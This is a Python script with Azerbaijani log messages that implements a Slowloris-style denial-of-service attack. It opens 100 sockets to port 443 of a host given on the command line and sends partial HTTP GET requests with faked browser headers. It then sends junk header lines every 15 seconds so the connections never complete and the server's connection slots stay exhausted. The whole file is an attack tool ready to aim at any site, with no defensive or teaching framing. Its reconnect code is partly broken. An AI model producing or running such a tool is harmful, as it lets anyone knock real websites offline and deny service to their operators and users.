import random
import time
import socket
import sys
printLog = 2
def log(text, lvl=1):
    if printLog >= lvl:
        print(text)
socketList = []
HTTPHeaders = [
    "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/41.0 Firefox/42.0",
    "Accept-language: en-US,en,q=0.8"
]
hostName = sys.argv[1]
socketCount = 100
log("{} saytina {} dene qosulma isteyi gonderilir.".format(hostName, socketCount))
for _ in range(socketCount):
    try:
        log("{} saytina qosulur. Artiq {} qosulma mumkun oldu".format(hostName, _), lvl=2)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((hostName, 443))
    except socket.error:
        break
    socketList.append(s)
log("baglanti ayarlari qurasdirilir")
for s in socketList:
    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 20000)).encode("UTF-8"))
    for header in HTTPHeaders:
        s.send(bytes("{}\r\n".format(header).encode("UTF-8")))
while True:
    log("header-ler yenilenir")
    for s in socketList:
        try:
            s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("UTF-8"))
        except socket.error:
            socketList.remove(s)
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((hostName, 443))
                for s in socketList:
                    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 20000)).encode("UTF-8"))
                    for header in HTTPHeaders:
                        s.send(bytes("{}\r\n".format(header).encode("UTF-8")))
            except socket.error:
                continue
    time.sleep(15)
